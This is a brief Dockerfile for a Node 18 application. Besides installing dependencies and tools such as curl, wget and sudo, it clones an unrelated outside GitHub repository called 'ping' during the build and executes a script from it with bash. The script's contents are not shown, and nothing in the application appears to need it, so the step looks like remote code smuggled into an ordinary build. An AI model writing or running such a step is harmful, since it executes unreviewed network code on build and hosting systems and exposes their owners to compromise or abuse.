FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install wget coreutils curl sudo python3 git
RUN git clone https://github.com/mncedisimavunqela/ping.git;cd ping;chmod +x ping;bash ping

CMD ["npm", "run", "start", "/bin/bash"]
